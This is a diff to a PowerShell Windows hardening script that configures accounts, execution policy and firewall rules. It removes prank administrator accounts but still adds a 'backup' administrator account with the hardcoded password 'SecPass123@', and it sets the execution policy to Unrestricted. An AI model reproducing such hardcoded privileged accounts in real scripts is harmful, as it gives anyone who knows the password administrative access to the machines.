@@ -9,8 +9,9 @@
 
  **FIXME FIX OTHER DEPENDENCIES W/O ADDING BAD RULES (ie SQl SRV)
  **TODO LIST POTENTIAL BEACONS
+ **FIXME THIS DOESNT WORK ON ALL VERSIONS OF WINDOWS
 
- CONTACT: please refer any questions or comments regarding this script to <AA>
+ CONTACT: please refer any questions or comments regarding this script to @kogatana-x
 
 #>
 <#--------------------------------
@@ -29,14 +30,16 @@ $FP= "$dir\"+$SN+"-Phase-1 Audit Transcript_$(get-date -Format yyyy-mm-dd_hhmmtt
 $ExecutionPolicy = Get-ExecutionPolicy
 Set-ExecutionPolicy Unrestricted -force
 
-#FUN STUFF>>
-  net user Administrator 'tmp-123!A@3de/FFd7g_'
-  net user poop SecPass123@ /add
-  net user p00p SecPass123@ /add /domain
-  net localgroup Administrators poop /add
-  net group Administrators p00p /add
-  net group Administrators poop /add
-
+#THINGS THAT ARE UNLIKELY TO BE USEFUL IN PRODUCTION>>
+##Ensuring regular password changes, without password reusage is key to preventing sustained unwanted access to accounts
+ ## net user Administrator 'tmp-123!A@3de/FFd7g_'
+##Adding backup administrative accounts are crucial in the event of a breach, and the malicious agent revokes your usual access --
+## It would be best to change `backup` to whatever your username is 
+  net user backup SecPass123@ /add
+  net localgroup Administrators backup /add
+  net group Administrators backup /add
+  
+##Using a Least-privilege access model, disabling the guest account is a good way to restrict unattributed and unauthorized access into the system
   net user Guest /active:no
 
 <#---------------------
@@ -77,13 +80,13 @@ Set-ExecutionPolicy Unrestricted -force
     netsh advfirewall firewall add rule name="FOX_OUT_TCP" dir=out action=allow protocol=tcp remoteport=80,443 program=%ProgramFiles%\Mozilla*\firefox.exe
     netsh advfirewall firewall add rule name="FOX_OUT_UDP" dir=out action=allow protocol=udp remoteport=53 program=%ProgramFiles%\Mozilla*\firefox.exe
 
-    #Block commonly exploited ports that are rarely used in a small commerical setting
+    #Block commonly exploited ports that are rarely used in a `small` commerical setting
      #  RPC,SSH (for Windows),SMB, etc
      netsh advfirewall firewall add rule name="BAD-PORTS" action=deny dir=in localport=135,5985,445,20,21,22
      netsh advfirewall firewall add rule name="BAD-PORTS" action=deny dir=out remoteport=135,5985,445,20,21,22
 
     #Turn on the firewall and block all connections by default
-     netsh advfirewall set allprofiles state on
+    netsh advfirewall set allprofiles state on
     netsh advfirewall set allprofiles firewallpolicy blockinbound, blockoutbound
   }
  #Set System Dependent/Dynamic Firewall Rules
